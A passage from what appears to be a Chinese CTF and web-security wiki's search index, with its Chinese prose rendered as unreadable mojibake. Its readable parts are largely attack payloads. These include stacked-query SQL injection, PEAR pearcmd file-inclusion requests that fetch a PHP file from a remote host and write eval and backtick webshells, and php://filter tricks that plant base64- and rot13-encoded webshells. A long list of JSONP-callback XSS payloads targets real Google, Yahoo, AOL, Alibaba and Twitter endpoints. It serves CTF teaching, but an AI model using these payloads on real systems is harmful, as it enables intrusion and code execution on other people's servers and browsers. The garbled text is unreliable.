è¿™é‡Œæ£€æµ‹åˆ°äº†setå’Œprepareå…³é”®è¯ï¼Œä½†strstrè¿™ä¸ªå‡½æ•°å¹¶ä¸èƒ½åŒºåˆ†å¤§å°å†™ï¼Œæˆ‘ä»¬å°†å…¶å¤§å†™å³å¯ã€‚-1;Set @sql = CONCAT(se,lect * from `1919810931114514`;);Prepare stmt from @sql;EXECUTE stmt; æ–¹æ³•ä¸‰ï¼šä½¿ç”¨rename å’Œ alteræˆ‘ä»¬ä½¿ç”¨renameå’Œalterè¿™ä¸¤ä¸ªå‘½ä»¤æ¥æ›´æ”¹è¡¨åå’Œå­—æ®µåã€‚å› ä¸ºæˆ‘ä»¬å¯ä»¥è®¿é—®wordsé‡Œçš„columnsï¼Œå‘ç°idï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥çš„1é»˜è®¤æ˜¯æŸ¥è¯¢wordsè¿™ä¸ªè¡¨çš„ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠwordsè¡¨æ”¹åæˆwords1è¡¨ï¼ŒæŠŠ1919810931114514è¡¨æ”¹åæˆwordsï¼Œç„¶åå†æŠŠ1919810931114514é‡Œé¢çš„flagå­—æ®µæ”¹åæˆidï¼Œç„¶åè¾“å…¥1â€™ or 1=1#å°±å¯ä»¥æˆåŠŸå¾—åˆ°flagäº†ã€‚ ä¿®æ”¹è¡¨å(å°†è¡¨åuseræ”¹ä¸ºusers)alter table user rename to users;ä¿®æ”¹åˆ—å(å°†å­—æ®µåusernameæ”¹ä¸ºname)alter table users change uesrname name varchar(30);1;alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);ç„¶åä½¿ç”¨ 1 or 1=1"},{"title":"pearæ–‡ä»¶åŒ…å«","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/pearæ–‡ä»¶åŒ…å«.html","content":"pearæ–‡ä»¶åŒ…å«æ¡ä»¶ï¼š æœ‰æ–‡ä»¶åŒ…å«ç‚¹ å¼€å¯äº†pearæ‰©å±• é…ç½®æ–‡ä»¶ä¸­register_argc_argv è®¾ç½®ä¸ºOn,è€Œé»˜è®¤ä¸ºOff ä¾‹é¢˜ ?phperror_reporting(0);$file = $_GET[file];if(isset($file) !preg_match(/input|data|phar|log|filter/i,$file)) include $file;else show_source(__FILE__); if(isset($_GET[info])) phpinfo(); æˆ‘ä»¬åˆ©ç”¨pearæ‰©å±•è¿›è¡Œæ–‡ä»¶åŒ…å« 1ã€è¿œç¨‹æ–‡ä»¶ä¸‹è½½å®ç°è¿œç¨‹æ–‡ä»¶åŒ…å«poc:/?file=/usr/local/lib/php/pearcmd.phpcaigo+install+R+/var/www/html/+http://xxx.xxx.xxx/1.php å®ƒæç¤ºä¸‹è½½åˆ°è¿™ä¸ªç›®å½•â€tmppeardownload1.phpâ€ï¼Œæˆ‘ä»¬å°è¯•åŒ…å«å®ƒ 2ã€ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œé…ç½®é¡¹ä¼ å…¥æˆ‘ä»¬æ¶æ„çš„phpä»£ç çš„å½¢å¼pocï¼š/?file=/usr/local/lib/php/pearcmd.php+-c+/tmp/ctf.php+-d+man_dir=?eval($_POST[1]);?+-s+ ç”±äºhackbarä¼šå°è¯•ç¼–ç å†™å…¥çš„æ•°æ®ä¼šå˜æˆè¿™æ ·%3C?eval($_POST[1]);?%3E;ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨burpä¿®æ”¹ä¸€ä¸‹å‘åŒ… æç¤ºå†™å…¥æˆåŠŸï¼Œå°è¯•åŒ…å«tmpctf.php 3ã€å†™é…ç½®æ–‡ä»¶æ–¹å¼poc:/?file=/usr/local/lib/php/pearcmd.phpaaaa+config-create+/var/www/html/?=`$_POST[1]`;?+1.php ç”±äºå¯èƒ½ä¼šé‡åˆ°å‰é¢çš„ç¼–ç é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨burp ç„¶åè®¿é—®ç½‘ç«™æ ¹ç›®å½•çš„1.php å› ä¸ºæˆ‘ä»¬å†™çš„pocæ˜¯ç¬¦å·åŒ…èµ·æ¥æ˜¯çš„å‘½ä»¤æ‰§è¡Œï¼Œè¦æ³¨æ„ä¸æ˜¯eval,æˆ‘ä»¬ç›´æ¥ç”¨curlåå¼¹ é™¤äº†pearcmdè¿˜æœ‰peclcmd"},{"title":"php_filter","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/php_filter.html","content":"php:è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµï¼ˆIO streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php:filterå’Œphp:input,php:filterç”¨äºè¯»å–æºç ã€‚ åŸºæœ¬php:inputç”¨äºæ‰§è¡Œphpä»£ç  php://filter # è¯»å–æºç  writeçš„è¯GETæäº¤?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOSTæäº¤content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=- wirteï¼šå†™å…¥- convert.base64-decodeï¼šå¯¹å†™è¿›æ–‡ä»¶é‡Œçš„å†…å®¹å…ˆè¿›è¡Œä¸€æ¬¡base64è§£ç ï¼Œå†å†™å…¥- resourceï¼šæŒ‡å®šå†™å…¥çš„æ–‡ä»¶å- contentæäº¤çš„å€¼æ˜¯ç»è¿‡base64ç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬//?php assert($_POST[x]);?æ–‡ä»¶åˆ›å»ºæˆåŠŸåï¼Œç›´æ¥èšå‰‘è¿æ¥å³å¯ string.rot13?php error_reporting(0);highlight_file(__FILE__);//flag in /flag$file = $_GET[file];$content = $_POST[content];file_put_contents($file,?php die();?.$content);? è¿™é“é¢˜å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ç»•è¿‡æ­»äº¡ä»£ï¼Œå› ä¸ºåœ¨ä¸­é—´åŠ ä¸Šäº†?php die();?ï¼Œè¿™å°±ä¼šå¯¼è‡´ä¼šç»ˆæ­¢phpçš„æ‰§è¡Œï¼Œä¸ä¼šè¿è¡Œ$contentçš„å€¼è¿™é‡Œæˆ‘ä»¬ç”¨å¦ä¸€ä¸ªè¿‡æ»¤å™¨string.rot13rot13ä¹Ÿå°±æ˜¯å‡¯æ’’13ï¼ŒROT13 ç¼–ç æ˜¯æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯å¾—åˆ°ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚ç¼–ç å’Œè§£ç éƒ½æ˜¯ç”±ç›¸åŒçš„å‡½æ•°å®Œæˆçš„ã€‚å¦‚æœæ‚¨æŠŠä¸€ä¸ªå·²ç¼–ç çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆå°†è¿”å›åŸå§‹å­—ç¬¦ä¸²ã€‚payload:GETæäº¤/?file=php://filter/write=string.rot13/resource=3.phpPOSTæäº¤content=?cuc nffreg($_CBFG[k]);?pocè§£é‡Šstring.rot13æ˜¯å‡¯æ’’13ç¼–ç contentæäº¤çš„å€¼æ˜¯ç»è¿‡rot13ç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ è¡¥å……ï¼šphp:filterå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨æ ¼å¼ä¸ºï¼šphp:filter è¿‡æ»¤å™¨(read)| è¿‡æ»¤å™¨(write) resource ç›®æ ‡æ–‡ä»¶å‚æ•°ï¼šresourceè¦è¿‡æ»¤çš„åˆ—è¡¨readè¯»åˆ—è¡¨ï¼Œè®¾ç½®è¿‡æ»¤å™¨writeå†™åˆ—è¡¨ï¼Œè®¾ç½®è¿‡æ»¤å™¨ è¿‡æ»¤å™¨å­—ç¬¦ä¸²è¿‡æ»¤å™¨string.rot13 string.rot13ï¼ˆè‡ª PHP 4.3.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ str_rot13()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ str_rot13â€”å¯¹å­—ç¬¦ä¸²æ‰§è¡ŒROT13è½¬æ¢. ROT13ç¼–ç ç®€å•åœ°ä½¿ç”¨å­—æ¯è¡¨ä¸­åé¢ç¬¬13ä¸ªå­—æ¯æ›¿æ¢å½“å‰å­—æ¯ï¼ŒåŒæ—¶å¿½ç•¥éå­—æ¯è¡¨ä¸­çš„å­—ç¬¦ã€‚ç¼–ç å’Œè§£ç éƒ½ä½¿ç”¨ç›¸åŒçš„å‡½æ•°ï¼Œä¼ é€’ä¸€ä¸ªç¼–ç è¿‡çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå°†å¾—åˆ°åŸå§‹å­—ç¬¦ä¸²ã€‚ string.toupper string.tolowerï¼ˆè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ strtoupperâ€”å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¤§å†™ string.tolower ï¼ˆè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ strtolowerâ€”å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™ string.strip_tagsä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strip_tags()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚å¯ä»¥ç”¨ä¸¤ç§æ ¼å¼æ¥æ”¶å‚æ•°ï¼šä¸€ç§æ˜¯å’Œstrip_tags()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ç›¸ä¼¼çš„ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åˆ—è¡¨çš„å­—ç¬¦ä¸²ï¼Œä¸€ç§æ˜¯ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åçš„æ•°ç»„ã€‚ strip_tagsâ€”ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°.è¯¥å‡½æ•°å°è¯•è¿”å›ç»™å®šçš„å­—ç¬¦ä¸²strå»é™¤ç©ºå­—ç¬¦ã€HTML å’Œ PHP æ ‡è®°åçš„ç»“æœã€‚å®ƒä½¿ç”¨ä¸å‡½æ•°fgetss()ä¸€æ ·çš„æœºåˆ¶å»é™¤æ ‡è®°ã€‚ è½¬æ¢è¿‡æ»¤å™¨å¦‚åŒ string.* è¿‡æ»¤å™¨ï¼Œconvert.* è¿‡æ»¤å™¨çš„ä½œç”¨å°±å’Œå…¶åå­—ä¸€æ ·ã€‚è½¬æ¢è¿‡æ»¤å™¨æ˜¯ PHP 5.0.0 æ·»åŠ çš„ã€‚convert.base64convert.base64-encodeå’Œ convert.base64-decodeä½¿ç”¨è¿™ä¸¤ä¸ªè¿‡æ»¤å™¨ç­‰åŒäºåˆ†åˆ«ç”¨base64_encode()å’Œbase64_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚convert.base64-encodeæ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚å¦‚æœç»™å‡ºäº†line-lengthï¼Œbase64 è¾“å‡ºå°†è¢«ç”¨line-lengthä¸ªå­—ç¬¦ä¸º é•¿åº¦è€Œæˆªæˆå—ã€‚å¦‚æœç»™å‡ºäº†line-break-charsï¼Œæ¯å—å°†è¢«ç”¨ç»™å‡ºçš„å­—ç¬¦éš”å¼€ã€‚è¿™äº›å‚æ•°çš„æ•ˆæœå’Œç”¨base64_encode()å†åŠ ä¸Š chunk_split()ç›¸åŒã€‚ convert.quotedconvert.quoted-printable-encodeå’Œconvert.quoted-printable-decodeä½¿ç”¨æ­¤è¿‡æ»¤å™¨çš„decodeç‰ˆæœ¬ç­‰åŒäºç”¨ quoted_printable_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚æ²¡æœ‰å’Œconvert.quoted-printable-encodeç›¸å¯¹åº”çš„å‡½æ•°ã€‚convert.quoted-printable-encodeæ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚é™¤äº†æ”¯æŒå’Œconvert.base64-encodeä¸€æ ·çš„é™„åŠ å‚æ•°å¤–ï¼Œconvert.quoted-printable-encodeè¿˜æ”¯æŒå¸ƒå°”å‚æ•°binaryå’Œ force-encode-firstã€‚convert.base64-decodeåªæ”¯æŒline-break-charså‚æ•°ä½œä¸ºä»ç¼–ç è½½è·ä¸­å‰¥ç¦»çš„ç±»å‹æç¤ºã€‚ convert.iconv.*è¿™ä¸ªè¿‡æ»¤å™¨éœ€è¦phpæ”¯æŒ iconv ï¼Œè€Œiconvæ˜¯é»˜è®¤ç¼–è¯‘çš„ã€‚ä½¿ç”¨convert.iconv.*è¿‡æ»¤å™¨ç­‰åŒäºç”¨iconv()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ iconv â€” å­—ç¬¦ä¸²æŒ‰è¦æ±‚çš„å­—ç¬¦ç¼–ç æ¥è½¬æ¢ convery.iconv.*çš„ä½¿ç”¨æœ‰ä¸¤ç§æ–¹æ³•: convert.iconv..orconvert.iconv.123æ”¯æŒçš„å­—ç¬¦ç¼–ç æœ‰ä¸€ä¸‹å‡ ç§ï¼ˆè¯¦ç»†å‚è€ƒå®˜æ–¹æ‰‹å†Œï¼‰ UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII* å¸¸è§è¿‡æ»¤å™¨ï¼šstring.xxx(å­—ç¬¦è¿‡æ»¤å™¨): string.rot13ã€string.toupperã€string.tolowerã€string.strip_tagsconvert.xxx (è½¬æ¢è¿‡æ»¤å™¨):convert.base64ã€convert.quoted-printableã€convert.iconvç­‰ç­‰compression.xxx(å‹ç¼©è¿‡æ»¤):compression.zlibã€compression.bzip2ã€compression.zlib.deflateã€compression.bzip2.compressç­‰ç­‰mcrypt(åŠ å¯†è¿‡æ»¤)ï¼šPHP 7.1.0èµ·åºŸå¼ƒï¼ #æ‰€ä»¥payloadï¼ˆphpæ–‡ä»¶è¯»å–ä½¿ç”¨ï¼šconvert.xxx (è½¬æ¢è¿‡æ»¤å™¨)ï¼‰ç¬¬ä¸‰æ­¥ï¼špayloadä¸ºï¼š?filenamephp:filterconvert.iconv.base64*.base64resourceindex.php###å‘ç°æ˜¾ç¤ºæœªæ‰¾åˆ°ï¼åº”è¯¥æ˜¯è½¬æ¢è¿‡æ»¤å™¨ä¸­çš„å­—ç¬¦ç¼–ç è¢«ç¦æ­¢äº†ï¼Œå­—ç¬¦ç¼–ç å­—å…¸æ›´æ¢ï¼Œçˆ†ç ´å­—ç¬¦ç¼–ç ã€‚å¸¸è§å­—ç¬¦ç¼–ç ï¼šUCS-4*UCS-4BEUCS-4LE*UCS-4LEUCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*EUC-JP*SJIS*eucJP-win*SJIS-win*"},{"title":"include(   .php)","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/include(   .php).html","content":"includeé™åˆ¶æ–‡ä»¶åç¼€if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) include($c..php); else highlight_file(__FILE__); $c å¯ä»¥ç”¨ï¼Ÿ æ¥é—­åˆ"},{"title":"åè®®&&ä¼ªåè®®","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/åè®®&&ä¼ªåè®®.html","content":"file:php:input # æ‰§è¡Œphpä»£ç php:filter # è¯»å–æºç zip: #å‹ç¼©æ–‡ä»¶ 1.ä»€ä¹ˆæ˜¯åè®®åè®®å‘¢ï¼Ÿå°±æ˜¯åŒæ–¹éƒ½èƒ½å¬æ˜ç™½çš„ä¸€ä¸ªæ²Ÿé€šçº¦å®šè¯­è¨€ï¼Œæ¯”å¦‚æˆ‘ä»¬è¯´çš„è¿™ä¸ªæ™®é€šè¯ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€ç§åè®®å•Šï¼Œæœ‰äº†å®ƒï¼Œæˆ‘ä»¬å¤©å—æµ·å°åŒ—çš„äººéƒ½èƒ½è¯´ä¸€ä¸ªåŒä¸€ä¸ªè¯­è°ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸œåŒ—çš„è´µå·çš„è¯´è¯äº’ç›¸çš„æ‰èƒ½å¬å¾—æ‡‚ï¼Œé‚£ä¹ˆåœ¨æˆ‘ä»¬è®¡ç®—æœºä¸­å‘¢ä¹Ÿæœ‰å¾ˆå¤šåè®® å¸¸è§çš„ç½‘ç»œå±‚æœ‰ IPåè®®ã€ICMPåè®®ã€ARPåè®®ã€IGMPåè®® åº”ç”¨å±‚ httpåè®®ã€httpsåè®®ã€ftpåè®®ã€sshåè®®ã€gopheråè®®ã€qqæ‹‰èµ·åè®® 2.åè®®çš„æ ¼å¼åè®®å¤´:å†…å®¹(å¤šä¸ºäºŒè¿›åˆ¶ 3.phpä¸­çš„åè®®file: è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ä¸å†™åè®®åå­—çš„æƒ…å†µä¸‹ï¼Œå°±é»˜è®¤æ˜¯fileåè®®å®ƒæ˜¯æ”¯æŒè¿™ä¸ªè·¯å¾„æ··æ‚æ¨¡å¼ï¼Œä»€ä¹ˆå«åšæ··æ‚æ¨¡å¼ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨linuxä¸‹ï¼Œè·¯å¾„å‘¢ä¸€èˆ¬åˆ†ä¸ºä»€ä¹ˆå¯¹å§ï¼Œåˆ†ä¸ºç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„ï¼Œå‡è®¾æˆ‘ä»¬ä½¿ç”¨includeåŒ…å«ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„flag.php,å®é™…ä¸Šæ˜¯åŒ…å«varwwwhtmlflag.php,å®ƒä¼šç”±ç›¸å¯¹è·¯å¾„è½¬æ¢ä¸ºç»å¯¹è·¯å¾„ http: è®¿é—® HTTP(s) ç½‘å€ï¼Œå¯ä»¥è·å–è¿œç¨‹çš„å†…å®¹ï¼Œè¿”å›åˆ°æœ¬åœ°ï¼Œä¹Ÿå¯ä»¥ç”¨åŒ…å«å‡½æ•°åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥è¯»å–è¿œç¨‹çš„phpæ–‡ä»¶åœ¨æœ¬åœ°æ‰§è¡Œï¼ŒRCEã€‚æ³¨æ„ï¼šåŒ…å«è¿œç¨‹æ–‡ä»¶éœ€åœ¨php.iniä¸­å°†allow_url_includeè®¾ç½®ä¸ºOnã€‚ ftp: é»˜è®¤21ç«¯å£ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ è¾“çš„åè®® data: data: #æ‰§è¡Œphpä»£ç  ?urldata:textplain, **data:**base64 ?urldata:textplain;base64, æ•°æ®ï¼ˆRFC 2397ï¼‰data: åŒæ ·ç±»ä¼¼ä¸php:inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ phar: â€” PHP å½’æ¡£ glob: â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ ssh2: â€” Secure Shell 2 rar: â€” RAR ogg: â€” éŸ³é¢‘æµ expect: â€” å¤„ç†äº¤äº’å¼çš„æµ zlib: â€” å‹ç¼©æµ zip: bzip2: zlib: åè®®ï¼š æ¡ä»¶ï¼šallow_url_fopen:offon allow_url_include :offon ä½œâ½¤ï¼šzip: bzip2: zlib: å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©â½‚ä»¶ä¸­çš„â¼¦â½‚ ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€å â½¤æ³•ï¼šzip:[å‹ç¼©â½‚ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©â½‚ä»¶å†…çš„â¼¦â½‚ä»¶å] compress.bzip2:file.bz2 compress.zlib:file.gz å…¶ä¸­phar:å’Œzip:ç±»ä¼¼"},{"title":"æœ‰æ„æ€çš„ç‚¹","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/æœ‰æ„æ€çš„ç‚¹.html","content":"å…ˆçœ‹ä»£ç ?phpshow_source(__FILE__);echo $_GET[hello];$page=$_GET[page];while (strstr($page, php://)) $page=str_replace(php://, , $page);include($page);? åªè¿‡æ»¤äº†php: æ²¡æœ‰è€ƒè™‘å¤§å°å†™ï¼Œä¹Ÿæ²¡æœ‰è€ƒè™‘data:æŒ‰éƒ¨å°±ç­çš„å¯ä»¥åšå‡ºæ¥ä½†æœ‰ä¸€ç‚¹ï¼Œä»£ç ä¸­çš„$_GET[â€˜helloâ€™];å¥½åƒæ²¡å•¥ç”¨ï¼Œçœ‹å®˜æ–¹WP åŸæ¥å¯ä»¥è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œæ„é€ å…¥ä¸‹http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E"},{"title":"JSONP ç»•è¿‡","path":"/wiki/WebçŸ¥è¯†ç‚¹/xss/JSONP ç»•è¿‡.html","content":"Google.com script+src=https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)/scriptscript+src=https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)/scriptscript+src=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)/scriptscript+src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)/scriptscript src=https://www.google.com/complete/search?client=chromeq=hellocallback=alert#1/script Blogger.com script src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/scriptscript+src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/script VK.com script+src=http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()/scriptscript+src=http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()/script AlibabaGroup script+src=https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)/scriptscript+src=https://suggest.taobao.com/sug?callback=alert(1337)/scriptscript+src=https://count.tbcdn.cn//counter3?callback=alert(1337)/scriptscript+src=https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)/scriptscript+src=https://wb.amap.com/channel.php?callback=alert(1337)/scriptscript+src=http://a.sm.cn/api/getgamehotboarddata?format=jsonppage=1_=1537365429621callback=confirm(1);jsonp1/scriptscript+src=http://api.m.sm.cn/rest?method=tools.sidercallback=jsonp_1869510867%3balert(1)%2f%2f794/script Uber.com â€œscript+srcâ€https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain); AOLYahoo script+src=https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?cb=alert(1337)/scriptscript+src=https://mempf.yahoo.co.jp/offer?position=hcallback=alert(1337)/scriptscript+src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1)//appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfoliosporttype=2portmax=5rf=http://www.dailyfinance.comcallback=jsonCallback24098%3balert(1)%2f%2f476_=1537149044679/scriptscript+src=https://api.cmi.aol.com/content/alert/homepage-alert?site=usaolcallback=confirm(1);//jQuery20108887725116629929_1528071050373472232_=1528071050374/scriptscript+src=https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback=confirm(1);//jQuery20108887725116629929_152807105037740504_=1528071050378/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooterchannel=financeportfolios=truedomain=portfolioscollapsed=1callback=confirm(9)//jQuery21307555521146732187_1538371213486_=1538371213487/scriptscript+src=http://portal.pf.aol.com/jsonmfus/?service=myportfolios,porttype=1portmax=100callback=confirm(9)//jQuery1710788849030856973_1538354104695_=1538354109053/script Twitter.com script+src=http://search.twitter.com/trends.json?callback=alert()/scriptscript+src=https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()/scriptscript+src=https://twitter.com/status/user_timeline/kbeautysalon.json?count=1callback=confirm()/script Others script+src=https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)/scriptscript+src=https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)/scriptscript+src=https://passport.ngs.ru/ajax/check?callback=alert(1337)/scriptscript+src=https://ulogin.ru/token.php?callback=alert(1337)/scriptscript+src=https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)/scriptscript+src=https://appcenter.intuit.com/Account/LogoutJSONP?callback=alert(1337)/scriptscript+src=https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)/scriptscript+src=https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)/scriptscript+src=https://api.mixpanel.com/track/?callback=alert(1337)/scriptscript+src=https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)/scriptscript+src=http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json/scriptscript+src=https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38/script#GoogleAPIsembed src=//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\)))catch(e)alert(1337)// allowscriptaccess=alwaysscript src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337/scriptng-appng-csp ng-click=$event.view.alert(1337)script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js/script#Yandex:script+src=https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)/scriptscript+src=https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert/script"},{"title":"xssç»•è¿‡","path":"/wiki/WebçŸ¥è¯†ç‚¹/xss/xssç»•è¿‡.html","content":"XSSç»•è¿‡æ€»ç»“ä¸€ã€åˆ†ç±»åå°„æ€§XSSå­˜å‚¨å‹XSSDOMå‹XSS åå°„å‹xss æ”»å‡»æ–¹å¼ æ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼å°†åŒ…å«XSSä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“ç›®æ ‡ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ¥å—è¯¥ç›®æ ‡ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿›è¡Œå¤„ç†ï¼Œç„¶åæœåŠ¡å™¨æŠŠå¸¦æœ‰XSSçš„ä»£ç å‘é€ç»™ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰XSSä»£ç çš„æ¶æ„è„šæœ¬åï¼Œå°±ä¼šè§¦å‘XSSæ¼æ´ã€‚ æ”»å‡»æ­¥éª¤ 1.æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç .2.ç”¨æˆ·æ‰“å¼€æœ‰æ¶æ„ä»£ç çš„URLæ—¶ï¼Œç½‘ç«™æœåŠ¡å™¨ç«¯å°†æ¶æ„ä»£ç 